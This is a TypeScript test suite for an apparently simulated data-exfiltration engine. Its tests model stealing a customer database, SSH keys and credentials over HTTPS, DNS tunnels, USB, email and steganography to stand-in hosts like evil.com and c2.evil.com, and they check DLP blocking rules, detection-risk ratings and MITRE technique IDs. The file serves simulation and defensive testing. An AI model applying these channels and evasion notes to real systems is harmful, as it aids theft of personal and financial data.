import { describe, it, expect, beforeEach } from 'vitest';
import { createExfiltrationEngine } from '../../../src/lib/exfiltration';
import type { ExfiltrationEngine, SensitiveData } from '../../../src/lib/exfiltration';

describe('Exfiltration Engine', () => {
    let engine: ExfiltrationEngine;
    let secretDoc: SensitiveData;

    beforeEach(() => {
        engine = createExfiltrationEngine();
        secretDoc = engine.addData({
            name: 'customer_database.sql',
            classification: 'secret',
            sizeBytes: 50_000_000,
            location: '/var/lib/mysql/customers.sql',
            format: 'sql',
            tags: ['pii', 'financial'],
        });
    });

    // ── Data Management ──────────────────────────────────────

    it('adds and retrieves sensitive data', () => {
        expect(engine.getData(secretDoc.id)).not.toBeNull();
        expect(engine.getData(secretDoc.id)!.name).toBe('customer_database.sql');
    });

    it('returns null for unknown data', () => {
        expect(engine.getData('nonexistent')).toBeNull();
    });

    it('listData returns all data items', () => {
        engine.addData({ name: 'keys.pem', classification: 'top_secret', sizeBytes: 3000, location: '/root/.ssh', format: 'pem', tags: ['crypto'] });
        expect(engine.listData()).toHaveLength(2);
    });

    // ── Exfiltration ─────────────────────────────────────────

    it('exfiltrates via HTTPS successfully', () => {
        const result = engine.exfiltrate({
            dataId: secretDoc.id, channel: 'https_post',
            sourceMachine: 'ws01', destination: 'evil.com',
            tick: 1,
        });
        expect(result.success).toBe(true);
        expect(result.bytesTransferred).toBe(50_000_000);
        expect(result.mitreTechnique).toBe('T1048.002');
        expect(result.detectionRisk).toBe('low');
    });

    it('exfiltrates via DNS tunnel with correct chunking', () => {
        const smallData = engine.addData({
            name: 'creds.txt', classification: 'confidential', sizeBytes: 1000,
            location: '/tmp', format: 'text', tags: [],
        });
        const result = engine.exfiltrate({
            dataId: smallData.id, channel: 'dns_tunnel',
            sourceMachine: 'ws01', destination: 'tunnel.evil.com', tick: 1,
        });
        expect(result.success).toBe(true);
        expect(result.chunksUsed).toBeGreaterThanOrEqual(Math.ceil(1000 / 253));
        expect(result.mitreTechnique).toBe('T1048.003');
    });

    it('exfiltrates via USB (no network required)', () => {
        const result = engine.exfiltrate({
            dataId: secretDoc.id, channel: 'usb',
            sourceMachine: 'ws01', destination: '/dev/sdb1', tick: 1,
        });
        expect(result.success).toBe(true);
        expect(result.mitreTechnique).toBe('T1052.001');
    });

    it('fails for nonexistent data', () => {
        const result = engine.exfiltrate({
            dataId: 'nonexistent', channel: 'https_post',
            sourceMachine: 'ws01', destination: 'evil.com', tick: 1,
        });
        expect(result.success).toBe(false);
        expect(result.reason).toContain('not found');
    });

    it('generates artifacts per channel type', () => {
        const result = engine.exfiltrate({
            dataId: secretDoc.id, channel: 'dns_tunnel',
            sourceMachine: 'ws01', destination: 'c2.evil.com', tick: 1,
        });
        expect(result.artifacts.length).toBeGreaterThan(0);
        expect(result.artifacts.some(a => a.type === 'dns_query')).toBe(true);
    });

    it('email exfiltration generates email artifact', () => {
        const result = engine.exfiltrate({
            dataId: secretDoc.id, channel: 'email_attachment',
            sourceMachine: 'ws01', destination: 'hacker@evil.com', tick: 1,
        });
        expect(result.success).toBe(true);
        expect(result.artifacts.some(a => a.type === 'email')).toBe(true);
        expect(result.detectionRisk).toBe('high');
    });

    it('custom chunk size limits to channel max', () => {
        const result = engine.exfiltrate({
            dataId: secretDoc.id, channel: 'dns_tunnel',
            sourceMachine: 'ws01', destination: 'c2.evil.com', tick: 1,
            chunkSizeBytes: 1_000_000, // Way over DNS max of 253
        });
        expect(result.chunksUsed).toBeGreaterThanOrEqual(Math.ceil(50_000_000 / 253));
    });

    it('steganography has low detection risk', () => {
        const smallData = engine.addData({
            name: 'key.bin', classification: 'secret', sizeBytes: 500,
            location: '/tmp', format: 'binary', tags: [],
        });
        const result = engine.exfiltrate({
            dataId: smallData.id, channel: 'steganography',
            sourceMachine: 'ws01', destination: 'innocuous-image-host.com', tick: 1,
        });
        expect(result.success).toBe(true);
        expect(result.detectionRisk).toBe('low');
    });

    it('encryption lowers detection risk by one level', () => {
        const result = engine.exfiltrate({
            dataId: secretDoc.id, channel: 'http_post',
            sourceMachine: 'ws01', destination: 'evil.com', tick: 1,
            encrypted: true,
        });
        expect(result.success).toBe(true);
        expect(result.detectionRisk).toBe('low'); // medium → low with encryption
    });

    // ── DLP Rules ────────────────────────────────────────────

    it('DLP rule blocks exfiltration on matching channel+classification', () => {
        engine.addDLPRule({
            id: 'dlp-1', name: 'Block secret via email',
            classification: 'secret',
            blockedChannels: ['email_attachment', 'email_body'],
            alertChannels: ['http_post'],
            enabled: true,
        });
        const result = engine.exfiltrate({
            dataId: secretDoc.id, channel: 'email_attachment',
            sourceMachine: 'ws01', destination: 'hacker@evil.com', tick: 1,
        });
        expect(result.success).toBe(false);
        expect(result.reason).toContain('DLP rule');
    });

    it('DLP rule does not block non-matching channel', () => {
        engine.addDLPRule({
            id: 'dlp-1', name: 'Block email only',
            classification: 'secret',
            blockedChannels: ['email_attachment'],
            alertChannels: [],
            enabled: true,
        });
        const result = engine.exfiltrate({
            dataId: secretDoc.id, channel: 'https_post',
            sourceMachine: 'ws01', destination: 'evil.com', tick: 1,
        });
        expect(result.success).toBe(true);
    });

    it('disabled DLP rule does not block', () => {
        engine.addDLPRule({
            id: 'dlp-1', name: 'Disabled',
            classification: 'secret',
            blockedChannels: ['https_post'],
            alertChannels: [],
            enabled: false,
        });
        const result = engine.exfiltrate({
            dataId: secretDoc.id, channel: 'https_post',
            sourceMachine: 'ws01', destination: 'evil.com', tick: 1,
        });
        expect(result.success).toBe(true);
    });

    it('removeDLPRule removes a rule', () => {
        engine.addDLPRule({
            id: 'dlp-1', name: 'Test',
            classification: 'secret', blockedChannels: ['https_post'],
            alertChannels: [], enabled: true,
        });
        expect(engine.removeDLPRule('dlp-1')).toBe(true);
        expect(engine.getDLPRules()).toHaveLength(0);
        expect(engine.removeDLPRule('nonexistent')).toBe(false);
    });

    // ── Channel Config ───────────────────────────────────────

    it('getChannelConfig returns known channel configs', () => {
        const dns = engine.getChannelConfig('dns_tunnel');
        expect(dns.maxBandwidthBps).toBe(5000);
        expect(dns.maxChunkSize).toBe(253);
        expect(dns.requiresNetwork).toBe(true);

        const usb = engine.getChannelConfig('usb');
        expect(usb.requiresNetwork).toBe(false);
    });

    it('getChannelConfig returns defaults for unknown channel', () => {
        const config = engine.getChannelConfig('carrier_pigeon');
        expect(config.channel).toBe('carrier_pigeon');
        expect(config.detectionRisk).toBe('medium');
    });

    // ── History & Stats ──────────────────────────────────────

    it('getExfilHistory includes all attempts', () => {
        engine.exfiltrate({ dataId: secretDoc.id, channel: 'https_post', sourceMachine: 'ws01', destination: 'evil.com', tick: 1 });
        engine.exfiltrate({ dataId: 'nonexistent', channel: 'dns_tunnel', sourceMachine: 'ws01', destination: 'c2.com', tick: 2 });
        expect(engine.getExfilHistory()).toHaveLength(2);
    });

    it('getStats returns accurate counts', () => {
        engine.addDLPRule({
            id: 'dlp-1', name: 'Block email',
            classification: 'secret', blockedChannels: ['email_attachment'],
            alertChannels: [], enabled: true,
        });
        engine.exfiltrate({ dataId: secretDoc.id, channel: 'https_post', sourceMachine: 'ws01', destination: 'evil.com', tick: 1 });
        engine.exfiltrate({ dataId: secretDoc.id, channel: 'email_attachment', sourceMachine: 'ws01', destination: 'hacker@evil.com', tick: 2 });

        const stats = engine.getStats();
        expect(stats.totalDataItems).toBe(1);
        expect(stats.totalExfilAttempts).toBe(2);
        expect(stats.successfulExfils).toBe(1);
        expect(stats.blockedExfils).toBe(1);
        expect(stats.totalBytesExfiltrated).toBe(50_000_000);
        expect(stats.channelsUsed).toContain('https_post');
        expect(stats.dlpRulesTriggered).toBe(1);
    });
});
